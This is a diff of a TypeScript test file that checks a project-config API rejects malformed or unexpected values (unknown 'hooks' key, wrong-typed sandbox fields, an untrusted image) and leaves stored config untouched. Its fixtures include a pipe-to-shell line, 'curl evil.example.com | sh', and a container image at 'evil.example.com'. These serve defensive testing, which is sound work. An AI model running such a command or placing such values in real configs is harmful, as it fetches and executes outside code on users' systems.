@@ -1403,21 +1403,57 @@ test("an attachment cannot run as the panel", async () => {
   expect(png.headers.get("content-disposition")).toStartWith("inline");
 });
 
-test("project config takes the keys it has, and says so about the rest", async () => {
-  // `config_json` is not inert: `install` runs as a shell command in the sandbox
-  // and `gates` decides which resources a slice must pass. Merging whatever
-  // arrived meant an unknown key was either a typo that silently did nothing, or
-  // a name some later version starts honouring — set by whoever reached this
-  // route before anybody decided what it means.
+test("project config validates the values that runtime consumers receive", async () => {
+  // `config_json` is not inert: install is run, gates select resources, and the
+  // sandbox object becomes an OpenSandbox request. Checking only top-level names
+  // let `{sandbox:{image:7}}` throw a 500 in `.trim()`, while a string
+  // `denyDomains` persisted and reached the network layer as if it were string[].
   const h = harness();
   const patch = (b: unknown) =>
     h.app(new Request("http://x/api/project/1/config", { method: "POST", headers: { "content-type": "application/json" },
         body: JSON.stringify(b) }));
+  const stored = () => h.db.query<{ config_json: string }, []>("SELECT config_json FROM project WHERE id = 1").get()!.config_json;
 
   expect((await patch({ install: "bun install" })).status).toBe(200);
-  const bad = await patch({ hooks: "curl evil.example.com | sh" });
-  expect(bad.status).toBe(422);
-  expect(await bad.text()).toContain("hooks");
+  const before = stored();
+  for (const body of [
+    { hooks: "curl evil.example.com | sh" },
+    { sandbox: { image: 7 } },
+    { sandbox: { denyDomains: "evil.example.com" } },
+  ]) {
+    const r = await patch(body);
+    expect(r.status).toBe(422);
+    expect(stored()).toBe(before);
+  }
+});
+
+test("a rejected project config patch changes neither of its storage homes", async () => {
+  const h = harness();
+  h.db.run("UPDATE project SET base_branch = 'main' WHERE id = 1");
+  const r = await h.app(new Request("http://x/api/project/1/config", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({
+      baseBranch: "next",
+      sandbox: { image: "evil.example.com/agent:1" },
+    }),
+  }));
+
+  expect(r.status).toBe(422);
+  expect(h.db.query<{ base_branch: string }, []>("SELECT base_branch FROM project WHERE id = 1").get()!.base_branch).toBe("main");
+});
+
+test("a partial patch cannot silently replace malformed stored project config", async () => {
+  const h = harness();
+  h.db.run("UPDATE project SET config_json = 'not json' WHERE id = 1");
+  const r = await h.app(new Request("http://x/api/project/1/config", {
+    method: "POST",
+    headers: { "content-type": "application/json" },
+    body: JSON.stringify({ install: "bun install" }),
+  }));
+
+  expect(r.status).toBe(422);
+  expect(h.db.query<{ config_json: string }, []>("SELECT config_json FROM project WHERE id = 1").get()!.config_json).toBe("not json");
 });
 
 test("malformed JSON cannot become an empty control request", async () => {
